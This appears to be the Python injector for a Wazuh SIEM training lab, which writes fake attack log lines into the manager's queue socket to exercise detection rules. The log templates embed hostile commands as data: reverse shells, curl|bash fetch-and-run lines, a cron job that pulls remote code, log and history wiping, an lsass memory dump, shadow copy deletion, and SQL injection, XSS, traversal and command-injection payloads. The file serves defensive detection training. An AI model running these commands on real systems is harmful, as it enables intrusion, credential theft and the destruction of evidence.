"""Scenario injector — writes labeled attack events to the analysisd queue socket.

Only event templates whose rules were VERIFIED to fire on the live manager (and
to carry data.srcip, so the attack map / triage sees a source) are included:

  sshd_invalid  -> rule 5710  groups[sshd,authentication_failed]  -> bruteforce
  sshd_failed   -> rule 5716/5710                                 -> bruteforce
  web_sqli      -> rule 31106 groups[web,accesslog,attack]        -> webattack
  web_xss       -> rule 31106                                     -> webattack
  web_traversal -> rule 31106                                     -> webattack
  web_cmdinj    -> rule 31106                                     -> webattack

Linux post-compromise / assume-breach (adversary already inside — successful
auth + on-host command activity rather than perimeter brute force):

  linux_ssh_accepted -> rule 5715  (Accepted password, carries srcip+dstuser)
  linux_ssh_pubkey   -> rule 5715  (Accepted publickey — stolen/implanted key)
  linux_sudo_root    -> rule 5402/5403 (sudo to root; 5403 first-time)
  linux_useradd      -> rule 5902  (new account — persistence)
  linux_authkey      -> rule 100210 (authorized_keys implant)   T1098.004
  linux_revshell     -> rule 100211 (reverse shell / C2)        T1059.004
  linux_download_exec-> rule 100212 (curl|bash tool ingress)    T1105
  linux_hist_wipe    -> rule 100213 (shell history wipe)        T1070.003
  linux_log_tamper   -> rule 100214 (system log tampering)      T1070.002
  linux_cron_persist -> rule 100215 (cron persistence)          T1053.003

Windows post-compromise / assume-breach (stolen creds + on-host actions):

  win_pth          -> rule 100135 (4624 type3 NTLM — Pass-the-Hash)     T1550.002
  win_ptt          -> rule 100136 (4624 type9 explicit — Pass-the-Ticket) T1550.003
  win_rdp_hijack   -> rule 100137 (4778 session reconnect — hijack)     T1563.002
  win_dcsync       -> rule 100138 (4662 replication rights — DCSync)    T1003.006
  win_schtask      -> rule 100139 (4698 scheduled task — persistence)   T1053.005
  win_defender_off -> rule 100170 (Defender 5001 real-time prot off)    T1562.001

The post-exploitation templates emit `snoopy` command-audit lines (no stock
rule exists for them); the training pack matches full_log with <match>.

A message is: `1:[<agentid>] (<agentname>) any-><location>:<raw log line>`.
Everything runs ON the Wazuh manager (the queue socket is a local UNIX socket).
"""
import json
import socket
import threading
import time
import random

import config

USERS = ["admin", "root", "test", "oracle", "ubuntu", "postgres", "git",
         "ftpuser", "deploy", "guest", "support", "www-data"]

# Windows identities used when a scenario step doesn't pin one via $TOKENs.
WIN_USERS = ["administrator", "jsmith", "adunn", "svc_backup", "helpdesk",
             "mwallace", "kperry", "operator", "sqladmin", "guest"]
WIN_SERVICES = ["svc_sql", "svc_web", "svc_backup", "MSSQLSvc", "svc_share",
                "svc_ldap", "svc_report", "http_svc"]

_SECURE = "any->/var/log/secure"
_AUTH = "any->/var/log/auth.log"
_ACCESS = "any->/var/log/apache2/access.log"
_WINEVT = "any->EventChannel"

_SEC_PROVIDER = "Microsoft-Windows-Security-Auditing"
_SEC_GUID = "{54849625-5478-4994-a5ba-3e3b0328c30d}"
_SYSMON_PROVIDER = "Microsoft-Windows-Sysmon"
_SYSMON_GUID = "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"


def _ts():
    return time.strftime("%b %d %H:%M:%S")


def _apache_ts():
    return time.strftime("%d/%b/%Y:%H:%M:%S +0000")


def _win_ts():
    return time.strftime("%Y-%m-%dT%H:%M:%S.000000000Z", time.gmtime())


def _winevt(event_id, computer, eventdata, provider=_SEC_PROVIDER,
            guid=_SEC_GUID, channel="Security", severity="AUDIT_FAILURE",
            message=""):
    """Build one Windows EventChannel JSON log (decoded by the json decoder;
    matched by the training_rules.xml 100100+ pack)."""
    ev = {"win": {
        "system": {
            "providerName": provider, "providerGuid": guid,
            "eventID": str(event_id), "channel": channel,
            "computer": computer, "systemTime": _win_ts(),
            "severityValue": severity, "message": message or "Windows event.",
            "eventRecordID": str(random.randint(100000, 9999999)),
        },
        "eventdata": eventdata,
    }}
    return _WINEVT, json.dumps(ev)


def _line(template, ip, st=None, computer="host01"):
    """Build one raw log line for a template + source IP.

    `st` is the (already $TOKEN-resolved) inject step, so Windows templates can
    read pinned values (user/service/image/cmd/dstip/file). `computer` is the
    target agent name shown as the Windows host.
    """
    st = st or {}
    pid = random.randint(1000, 65000)
    port = random.randint(1024, 65535)
    user = random.choice(USERS)
    host = "srv"

    # ---- Linux syslog / web (verified: rules 5710/5716 + 31106) ----
    if template == "sshd_invalid":
        return _SECURE, "%s %s sshd[%d]: Failed password for invalid user %s from %s port %d ssh2" % (
            _ts(), host, pid, user, ip, port)
    if template == "sshd_failed":
        return _SECURE, "%s %s sshd[%d]: Failed password for %s from %s port %d ssh2" % (
            _ts(), host, pid, user, ip, port)
    if template == "web_sqli":
        return _ACCESS, '%s - - [%s] "GET /index.php?id=1+UNION+SELECT+username,password+FROM+users HTTP/1.1" 200 %d' % (
            ip, _apache_ts(), random.randint(400, 4000))
    if template == "web_xss":
        return _ACCESS, '%s - - [%s] "GET /search?q=<script>document.cookie</script> HTTP/1.1" 200 %d' % (
            ip, _apache_ts(), random.randint(400, 4000))
    if template == "web_traversal":
        return _ACCESS, '%s - - [%s] "GET /app?file=../../../../etc/passwd HTTP/1.1" 200 %d' % (
            ip, _apache_ts(), random.randint(400, 4000))
    if template == "web_cmdinj":
        return _ACCESS, '%s - - [%s] "GET /ping?host=127.0.0.1;wget+http://45.9.148.3/x.sh HTTP/1.1" 200 %d' % (
            ip, _apache_ts(), random.randint(400, 4000))

    # ---- Linux post-compromise / assume-breach ---------------------------
    # Adversary already inside via stolen creds / a valid session. Successful
    # auth + privilege + command activity rather than perimeter brute force.
    #   linux_ssh_accepted / _pubkey -> stock rule 5715 (auth success, srcip)
    #   linux_sudo_root              -> stock rule 5402/5403 (sudo to root)
    #   linux_useradd                -> stock rule 5902 (new account)
    # Post-exploitation command activity has no reliable stock rule, so it is
    # emitted as `snoopy` command-audit lines matched by the training pack
    # (training_rules.xml 100209-100215). full_log carries the command the
    # analyst must read.
    luser = st.get("user") or random.choice(USERS)
    if template == "linux_ssh_accepted":      # stolen-credential interactive login
        return _SECURE, "%s %s sshd[%d]: Accepted password for %s from %s port %d ssh2" % (
            _ts(), host, pid, luser, ip, port)
    if template == "linux_ssh_pubkey":        # session via implanted / stolen key
        return _SECURE, "%s %s sshd[%d]: Accepted publickey for %s from %s port %d ssh2: RSA SHA256:%s" % (
            _ts(), host, pid, luser, ip, port,
            "".join(random.choice("ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz0123456789+/") for _ in range(43)))
    if template == "linux_sudo_root":         # privilege escalation with valid creds
        cmd = st.get("cmd") or "/bin/bash"
        return _AUTH, "%s %s sudo:  %s : TTY=pts/0 ; PWD=/home/%s ; USER=root ; COMMAND=%s" % (
            _ts(), host, luser, luser, cmd)
    if template == "linux_useradd":           # persistence — rogue account
        newu = st.get("newuser") or ("svc" + str(random.randint(10, 99)))
        return _AUTH, "%s %s useradd[%d]: new user: name=%s, UID=%d, GID=%d, home=/home/%s, shell=/bin/bash" % (
            _ts(), host, pid, newu, 1000 + random.randint(30, 90),
            1000 + random.randint(30, 90), newu)
    if template.startswith("linux_") and template not in (
            "linux_ssh_accepted", "linux_ssh_pubkey", "linux_sudo_root", "linux_useradd"):
        return _snoopy_line(template, luser, ip, st, host, pid)

    # ---- Windows Security channel (training_rules.xml 100110-100134) ----
    wuser = st.get("user") or random.choice(WIN_USERS)
    wsvc = st.get("service") or random.choice(WIN_SERVICES)
    if template == "win_logon_fail":          # 4625 network logon failure
        return _winevt(4625, computer, {
            "targetUserName": wuser, "targetDomainName": "LAB",
            "status": "0xc000006d", "subStatus": "0xc0000064",
            "logonType": "3", "authenticationPackageName": "NTLM",
            "workstationName": "KALI", "ipAddress": ip, "ipPort": str(port)},
            message="An account failed to log on.")
    if template == "win_rdp_fail":            # 4625 logonType 10 (RDP)
        return _winevt(4625, computer, {
            "targetUserName": wuser, "targetDomainName": "LAB",
            "status": "0xc000006d", "subStatus": "0xc0000064",
            "logonType": "10", "authenticationPackageName": "Negotiate",
            "workstationName": "-", "ipAddress": ip, "ipPort": str(port)},
            message="An account failed to log on (RDP).")
    if template == "win_lockout":             # 4740
        return _winevt(4740, computer, {
            "targetUserName": wuser, "targetDomainName": "LAB",
            "callerComputerName": "WKS-" + str(random.randint(1, 40))},
            severity="AUDIT_SUCCESS", message="A user account was locked out.")
    if template == "win_kerberoast":          # 4769 RC4 service ticket
        return _winevt(4769, computer, {
            "targetUserName": wuser + "@LAB.LOCAL", "serviceName": wsvc,
            "serviceSid": "S-1-5-21-1-2-3-%d" % random.randint(1100, 1300),
            "ticketOptions": "0x40810000", "ticketEncryptionType": "0x17",
            "ipAddress": "::ffff:" + ip, "ipPort": str(port), "status": "0x0"},
            severity="AUDIT_SUCCESS",
            message="A Kerberos service ticket was requested.")
    if template == "win_asrep":               # 4768 no pre-auth (AS-REP)
        return _winevt(4768, computer, {
            "targetUserName": wuser, "targetDomainName": "LAB",
            "preAuthType": "0", "ticketEncryptionType": "0x17",
            "ipAddress": "::ffff:" + ip, "status": "0x0"},
            severity="AUDIT_SUCCESS",
            message="A Kerberos authentication ticket (TGT) was requested.")
    if template == "win_priv_logon":          # 4672
        return _winevt(4672, computer, {
            "subjectUserName": wuser, "subjectDomainName": "LAB",
            "privilegeList": "SeDebugPrivilege\n\t\t\tSeTcbPrivilege"},
            severity="AUDIT_SUCCESS",
            message="Special privileges assigned to new logon.")
    if template == "win_user_add":            # 4720
        return _winevt(4720, computer, {
            "targetUserName": wuser, "targetDomainName": "LAB",
            "subjectUserName": "administrator"},
            severity="AUDIT_SUCCESS", message="A user account was created.")
    if template == "win_group_add":           # 4728 / 4732
        return _winevt(4732, computer, {
            "targetUserName": st.get("group") or "Administrators",
            "memberName": "CN=%s,CN=Users,DC=lab" % wuser,
            "subjectUserName": "administrator"},
            severity="AUDIT_SUCCESS",
            message="A member was added to a security-enabled group.")
    if template == "win_service_install":     # 7045
        return _winevt(7045, computer, {
            "serviceName": st.get("service") or "WinToolSvc",
            "imagePath": st.get("image") or "%%SystemRoot%%\\svc%d.exe" % pid,
            "serviceType": "user mode service", "startType": "auto start"},
            channel="System", severity="INFORMATION",
            message="A service was installed in the system.")
    if template == "win_log_cleared":         # 1102
        return _winevt(1102, computer, {
            "subjectUserName": wuser, "subjectDomainName": "LAB"},
            severity="AUDIT_SUCCESS",
            message="The audit log was cleared.")
    if template == "win_lateral_logon":       # 4624 type3 network logon
        return _winevt(4624, computer, {
            "targetUserName": wuser, "targetDomainName": "LAB",
            "logonType": "3", "authenticationPackageName": "Kerberos",
            "ipAddress": ip, "ipPort": str(port)},
            severity="AUDIT_SUCCESS",
            message="An account was successfully logged on.")

    # ---- Windows assume-breach: stolen creds / hijacked sessions ---------
    # Adversary already authenticated. Reuse of stolen secrets (hash/ticket),
    # takeover of a live session, credential theft from AD, and persistence —
    # all successful events, no perimeter brute force. (100135-100139, 100170)
    if template == "win_pth":                 # 4624 type3 NTLM — Pass-the-Hash
        return _winevt(4624, computer, {
            "targetUserName": wuser, "targetDomainName": "LAB",
            "logonType": "3", "authenticationPackageName": "NTLM",
            "logonProcessName": "NtLmSsp", "keyLength": "0",
            "workstationName": "KALI", "ipAddress": ip, "ipPort": str(port)},
            severity="AUDIT_SUCCESS",
            message="An account was successfully logged on.")
    if template == "win_ptt":                 # 4624 type9 seclogo — overpass/Pass-the-Ticket
        return _winevt(4624, computer, {
            "targetUserName": wuser, "targetDomainName": "LAB",
            "logonType": "9", "authenticationPackageName": "Negotiate",
            "logonProcessName": "seclogo",
            "processName": "C:\\Windows\\System32\\runas.exe",
            "ipAddress": "-", "ipPort": "-"},
            severity="AUDIT_SUCCESS",
            message="An account was logged on with explicit credentials.")
    if template == "win_rdp_hijack":          # 4778 session reconnected from a new source
        return _winevt(4778, computer, {
            "accountName": wuser, "accountDomain": "LAB",
            "sessionName": "RDP-Tcp#%d" % random.randint(1, 9),
            "clientName": "KALI", "clientAddress": ip},
            severity="AUDIT_SUCCESS",
            message="A session was reconnected to a Window Station.")
    if template == "win_dcsync":              # 4662 replication rights — DCSync
        return _winevt(4662, computer, {
            "subjectUserName": wuser, "subjectDomainName": "LAB",
            "objectServer": "DS", "objectType": "domainDNS",
            "operationType": "Object Access", "accessMask": "0x100",
            "properties": "Replicating Directory Changes "
                          "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} "
                          "{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}"},
            severity="AUDIT_SUCCESS",
            message="An operation was performed on an object.")
    if template == "win_schtask":             # 4698 scheduled task created (persistence)
        return _winevt(4698, computer, {
            "subjectUserName": wuser, "subjectDomainName": "LAB",
            "taskName": st.get("task")
            or "\\Microsoft\\Windows\\UpdateOrchestrator\\SvcRefresh",
            "taskContent": st.get("cmd")
            or "<Exec><Command>powershell.exe</Command><Arguments>"
               "-nop -w hidden -enc SQBFAFgA</Arguments></Exec>"},
            severity="AUDIT_SUCCESS",
            message="A scheduled task was created.")
    if template == "win_defender_off":        # Defender 5001 real-time protection disabled
        return _winevt(5001, computer, {
            "product": "Windows Defender Antivirus"},
            provider="Microsoft-Windows-Windows Defender",
            guid="{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}",
            channel="Microsoft-Windows-Windows Defender/Operational",
            severity="INFORMATION",
            message="Real-time protection is disabled.")

    # ---- Sysmon channel (training_rules.xml 100140-100161) ----
    if template.startswith("sysmon_"):
        return _sysmon(template, ip, st, computer, pid)

    raise ValueError("unknown template: %s" % template)


def _snoopy_line(template, luser, ip, st, host, pid):
    """Linux post-compromise command activity as a `snoopy` audit line.

    snoopy(1) logs every executed command to authpriv; the syslog predecoder
    extracts program_name=snoopy and the command lands in full_log, which the
    training pack (100209-100215) matches with <match>. No stock decoder is
    required, so these fire deterministically on any manager.
    """
    uid = 1000 + random.randint(0, 40)
    cmd = st.get("cmd")
    if not cmd:
        if template == "linux_authkey":        # persistence — SSH key implant
            cmd = "tee -a /home/%s/.ssh/authorized_keys" % luser
        elif template == "linux_revshell":     # C2 — reverse shell
            cmd = random.choice([
                "bash -c bash -i >& /dev/tcp/%s/443 0>&1" % ip,
                "mkfifo /tmp/f; nc %s 4444 0</tmp/f | /bin/sh >/tmp/f 2>&1" % ip,
                "socat TCP:%s:9001 EXEC:'bash -li',pty,stderr" % ip])
        elif template == "linux_download_exec":  # tool ingress
            cmd = random.choice([
                "curl -s http://%s/x.sh | bash" % ip,
                "wget -qO- http://%s/kit.sh | sh" % ip])
        elif template == "linux_hist_wipe":    # defense evasion — history
            cmd = random.choice([
                "rm -f /home/%s/.bash_history" % luser,
                "ln -sf /dev/null /home/%s/.bash_history" % luser,
                "unset HISTFILE; history -c"])
        elif template == "linux_log_tamper":   # defense evasion — logs
            cmd = random.choice([
                "truncate -s0 /var/log/auth.log",
                "rm -f /var/log/wtmp /var/log/btmp",
                "shred -u /var/log/secure"])
        elif template == "linux_cron_persist":  # persistence — cron
            cmd = random.choice([
                "tee /etc/cron.d/apache-update",
                "crontab -l | tee /tmp/c; echo '* * * * * curl -s http://%s/b|sh' | crontab -" % ip])
        else:
            raise ValueError("unknown linux template: %s" % template)
    return _AUTH, "%s %s snoopy[%d]: [uid:%d sid:%d tty:(pts/0) cwd:/home/%s filename:/bin/bash]: %s" % (
        _ts(), host, pid, uid, random.randint(1000, 9000), luser, cmd)


def _sysmon(template, ip, st, computer, pid):
    """Sysmon operational-channel events."""
    def evt(eid, data, msg):
        return _winevt(eid, computer, data, provider=_SYSMON_PROVIDER,
                       guid=_SYSMON_GUID,
                       channel="Microsoft-Windows-Sysmon/Operational",
                       severity="INFORMATION", message=msg)
    user = st.get("user") or ("LAB\\" + random.choice(WIN_USERS))
    if template == "sysmon_ps_enc":           # 100141
        return evt(1, {
            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "commandLine": st.get("cmd") or "powershell.exe -nop -w hidden -enc SQBFAFgAKA==",
            "user": user, "parentImage": "C:\\Windows\\System32\\cmd.exe",
            "parentCommandLine": "cmd.exe /c start /min", "processId": str(pid)},
            "Process Create.")
    if template == "sysmon_lolbin":           # 100142
        img = st.get("image") or random.choice(
            ["rundll32.exe", "regsvr32.exe", "mshta.exe", "certutil.exe"])
        return evt(1, {
            "image": "C:\\Windows\\System32\\" + img,
            "commandLine": st.get("cmd") or (img + " /s /u /i:http://" + ip + "/a.sct scrobj.dll"),
            "user": user, "parentImage": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
            "parentCommandLine": "WINWORD.EXE /n", "processId": str(pid)},
            "Process Create.")
    if template == "sysmon_creddump":         # 100143
        return evt(1, {
            "image": "C:\\Windows\\System32\\rundll32.exe",
            "commandLine": st.get("cmd") or "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 640 C:\\lsass.dmp full",
            "user": user, "parentImage": "C:\\Windows\\System32\\cmd.exe",
            "parentCommandLine": "cmd.exe", "processId": str(pid)},
            "Process Create.")
    if template == "sysmon_shadow_del":       # 100144
        return evt(1, {
            "image": "C:\\Windows\\System32\\vssadmin.exe",
            "commandLine": st.get("cmd") or "vssadmin.exe delete shadows /all /quiet",
            "user": user, "parentImage": "C:\\Windows\\System32\\cmd.exe",
            "parentCommandLine": "cmd.exe /c", "processId": str(pid)},
            "Process Create.")
    if template == "sysmon_netconn":          # 100150 / 100151
        return evt(3, {
            "image": st.get("image") or "C:\\Users\\Public\\svchost.exe",
            "user": user, "protocol": "tcp", "sourceIp": "10.10.0.%d" % random.randint(20, 40),
            "sourcePort": str(random.randint(49152, 65535)),
            "destinationIp": st.get("dstip") or ip,
            "destinationPort": st.get("dstport") or "443",
            "destinationHostname": st.get("dsthost") or "cdn-edge.example.net"},
            "Network connection detected.")
    if template == "sysmon_file_create":      # 100160 / 100161
        ext = st.get("ext") or ".locked"
        return evt(11, {
            "image": st.get("image") or "C:\\Users\\Public\\enc.exe",
            "targetFilename": "C:\\Users\\%s\\Documents\\file%d%s" % (
                random.choice(WIN_USERS), random.randint(1, 99999), ext),
            "user": user, "processId": str(pid)},
            "File created.")
    raise ValueError("unknown sysmon template: %s" % template)


class Injector:
    """One socket, reused. Thread-safe send with reconnect-on-error."""

    def __init__(self, sock_path=None):
        self.sock_path = sock_path or config.QUEUE_SOCKET
        self._s = None
        self._lock = threading.Lock()

    def _connect(self):
        self._s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self._s.connect(self.sock_path)

    def send(self, agent_id, agent_name, location, raw):
        # location is e.g. "any->/var/log/secure"; final wire msg:
        #   1:[id] (name) any->/path:<raw log>
        msg = "1:[%s] (%s) %s:%s" % (agent_id, agent_name, location, raw)
        with self._lock:
            for attempt in (1, 2):
                try:
                    if self._s is None:
                        self._connect()
                    self._s.send(msg.encode())
                    return
                except OSError:
                    self._s = None
                    if attempt == 2:
                        raise


# --- run tracking (in-memory; a run = one scenario injection) ---
_runs = {}
_runs_lock = threading.Lock()


def run_state(run_id):
    """Return progress for an exact run id, or the latest run of a scenario id."""
    with _runs_lock:
        if run_id in _runs:
            return dict(_runs[run_id])
        # fall back: treat as a scenario id -> most recent run for it
        matches = [(v.get("started", 0), v) for v in _runs.values()
                   if v.get("scenario") == run_id]
        if matches:
            return dict(max(matches, key=lambda m: m[0])[1])
        return {}


def _emit_scenario(run_id, scenario, agents):
    inj = Injector()
    steps = scenario.get("inject", {}).get("steps", [])
    total = 0
    for st in steps:
        total += int(st.get("count", 1))
    with _runs_lock:
        _runs[run_id]["total"] = total
    sent = 0
    for st in steps:
        template = st["template"]
        agent_name = st.get("agent") or random.choice(list(agents))
        agent_id = agents.get(agent_name, "000")
        ips = st.get("srcips") or [st.get("srcip")]
        count = int(st.get("count", 1))
        spacing = st.get("spacing", [3, 10])
        for _ in range(count):
            ip = random.choice([i for i in ips if i]) or "10.10.0.9"
            location, raw = _line(template, ip, st, agent_name)
            try:
                inj.send(agent_id, agent_name, location, raw)
            except OSError as e:
                with _runs_lock:
                    _runs[run_id]["error"] = str(e)
                return
            sent += 1
            with _runs_lock:
                _runs[run_id]["sent"] = sent
            time.sleep(random.uniform(float(spacing[0]), float(spacing[1])))
        # gap between steps
        time.sleep(random.uniform(2, 6))
    with _runs_lock:
        _runs[run_id]["done"] = True


def launch(scenario, agents):
    """Start injecting a scenario in the background. Returns a run id."""
    run_id = "%s-%d" % (scenario["id"], int(time.time()))
    with _runs_lock:
        _runs[run_id] = {"scenario": scenario["id"], "sent": 0, "total": 0,
                         "done": False, "started": time.time()}
    t = threading.Thread(target=_emit_scenario, args=(run_id, scenario, agents), daemon=True)
    t.start()
    return run_id
